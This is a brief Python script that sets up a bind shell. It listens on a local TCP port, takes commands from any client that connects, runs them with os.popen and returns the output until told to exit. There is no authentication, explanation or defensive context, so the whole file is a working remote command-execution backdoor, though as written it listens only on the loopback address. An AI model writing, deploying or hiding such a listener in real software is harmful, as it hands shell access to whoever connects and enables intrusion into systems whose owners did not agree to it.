import os
import socket

server = socket.socket()
server.bind(("127.0.0.1", 4442))
server.listen(1)

c, addr = server.accept()

cmd = c.recv(2048)
while cmd != "exit":
    ans = os.popen(cmd).read()
    c.send(ans)
    cmd = c.recv(2048)


c.close()
server.close()
